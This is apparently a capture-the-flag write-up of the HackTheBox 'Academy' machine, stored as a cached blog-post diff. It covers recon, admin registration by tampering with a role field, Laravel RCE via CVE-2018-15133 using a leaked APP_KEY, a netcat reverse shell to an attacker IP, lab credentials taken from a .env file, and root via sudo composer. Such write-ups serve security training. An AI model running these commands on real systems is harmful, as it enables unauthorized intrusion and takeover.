@@ -1,0 +1,212 @@
+I"�*<p><img src="/assets/images/Academy/cover.png" alt="" /></p>
+
+<h2 id="portscan">Portscan</h2>
+<hr />
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="n">PORT</span>      <span class="k">STATE</span> <span class="n">SERVICE</span> <span class="k">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="k">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mi">8</span><span class="p">.</span><span class="mi">2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="k">open</span>  <span class="n">http</span><span class="o">?</span>
+<span class="mi">33060</span><span class="o">/</span><span class="n">tcp</span> <span class="k">open</span>  <span class="n">mysqlx</span><span class="o">?</span>
+<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">DNSStatusRequestTCP</span><span class="p">,</span> <span class="n">LDAPSearchReq</span><span class="p">,</span> <span class="n">NotesRPC</span><span class="p">,</span> <span class="n">SSLSessionReq</span><span class="p">,</span> <span class="n">TLSSessionReq</span><span class="p">,</span> <span class="n">X11Probe</span><span class="p">,</span> <span class="n">afp</span><span class="p">:</span> 
+<span class="o">|</span>     <span class="n">Invalid</span> <span class="n">message</span><span class="nv">"
+|_    HY000
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="reconaissance">Reconaissance</h2>
+<hr />
+
+<p>like usual im gonna use whatweb command for definition a site</p>
+
+<blockquote>
+  <p>whatweb http://$ip</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>http://10.10.10.215 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], RedirectLocation[http://academy.htb/]
+http://academy.htb/ [302 Found] Country[INDONESIA][ID], HTTPServer[BigIP], IP[36.86.63.182], RedirectLocation[http://mercusuar.uzone.id]
+http://mercusuar.uzone.id [200 OK] Bootstrap, Country[INDONESIA][ID], Frame, HTML5, HTTPServer[nginx], IP[36.86.63.180], JQuery[2.2.4], PHP[5.6.40], Script[text/javascript], Title[Mercusuar], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-Powered-By[PHP/5.6.40], X-XSS-Protection[1; mode=block], YouTube, nginx
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>as you can see we got new domain, added into host file then access it.</p>
+
+<blockquote>
+  <p>http://academy.htb/</p>
+</blockquote>
+
+<p><img src="/assets/images/Academy/1.png" alt="" /></p>
+
+<p>found login.php and register.php</p>
+
+<blockquote>
+  <p>http://academy.htb/login.php</p>
+</blockquote>
+
+<p><img src="/assets/images/Academy/2.png" alt="" /></p>
+
+<blockquote>
+  <p>http://academy.htb/register.php</p>
+</blockquote>
+
+<p><img src="/assets/images/Academy/3.png" alt="" /></p>
+
+<p>tried register and login with my account</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>unknown:1
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/images/Academy/4.png" alt="" /></p>
+
+<p>as you can see i able to login, but that is something wronng im not login as unkwon but egre55 as creator.</p>
+
+<p>im gonna doing scanning directory for finding something important using dirb.</p>
+
+<blockquote>
+  <p>dirb http://academy.htb/</p>
+</blockquote>
+
+<p><img src="/assets/images/Academy/9.png" alt="" /></p>
+
+<p>i found admin.php for admin panel, the mystakes is on register page.</p>
+
+<p>here’s my assumtion this site using role like if role = 0 you can register as user but if you register role = 1 you can login as admin.
+it’s clearly when im check the source code on register.php</p>
+
+<p><img src="/assets/images/Academy/5.png" alt="" /></p>
+
+<p>so im back again on register.php for register as admin with role 1, you doing this with burpsuite or developer tools then login on admin page as admin with password 1</p>
+
+<p><img src="/assets/images/Academy/6.png" alt="" /></p>
+
+<blockquote>
+  <p>http://academy.htb/admin-page.php</p>
+</blockquote>
+
+<p><img src="/assets/images/Academy/7.png" alt="" /></p>
+
+<p>as you can see i logged as admin! YAY!</p>
+
+<p>now i’ve got new subdomain again , added into host file</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Fix issue with dev-staging-01.academy.htb
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>http://dev-staging-01.academy.htb/</p>
+</blockquote>
+
+<p><img src="/assets/images/Academy/8.png" alt="" /></p>
+
+<p>this site based on laravel XD… similiar error</p>
+
+<p>this error telling us crutial information</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="no">APP_NAME</span> 	
+<span class="s2">"Laravel"</span>
+
+<span class="no">APP_ENV</span> 	
+<span class="s2">"local"</span>
+
+<span class="no">APP_KEY</span> 	
+<span class="s2">"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>im googling about this APP key for laravel and found this <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133">CVE-2018-15133</a> and poc code in <a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133">here</a></p>
+
+<p>we can easily to exploit as long as we have app key</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c pwd</code></p>
+
+<p><img src="/assets/images/Academy/10.png" alt="" /></p>
+
+<p>nice RCE , now it’s time to revershell</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.128 9000 &gt;/tmp/f'</code></p>
+
+<p>and start listner</p>
+
+<p><code class="language-plaintext highlighter-rouge">rlwrap nc -lnvp 9000</code></p>
+
+<p><img src="/assets/images/Academy/11.png" alt="" /></p>
+
+<p>upgrade shell with following command :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>i found user.txt on dir /home/cry0l1t3, for password carolite i found that in /var/www/html/academy/.env this file contains information about the site.</p>
+
+<p><img src="/assets/images/Academy/13.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>mySup3rP4s5w0rd!!
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>login via ssh for stable shell and grab user.txt</p>
+
+<p><img src="/assets/images/Academy/15.png" alt="" /></p>
+
+<p>there is no sudo -l command with this user, and already check the os using command lsb_release with newest os until linpeas.sh show me the way</p>
+
+<p><img src="/assets/images/Academy/16.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">su mrb3n:mrb3n_Ac@d3my!</code></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<hr />
+
+<p>for mrb3n user we can run command sudo -l for gain root access</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/assets/images/Academy/17.png" alt="" /></p>
+
+<p>we can take advantages of composer, execute this command below will lead you into root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s1">'{"scripts":{"x":"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"}}'</span> <span class="o">&gt;</span><span class="nv">$TF</span>/composer.json
+<span class="nb">sudo </span>composer <span class="nt">--working-dir</span><span class="o">=</span><span class="nv">$TF</span> run-script x
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/images/Academy/18.png" alt="" /></p>
+
+<p>and grab our root.txt</p>
+
+<p><img src="/assets/images/Academy/19.png" alt="" /></p>
+
+<h3 id="referencess">Referencess</h3>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="gp">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#</span>bash-tcp
+<span class="go">https://netsec.ws/?p=337
+https://gtfobins.github.io/gtfobins/composer/
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+:ET
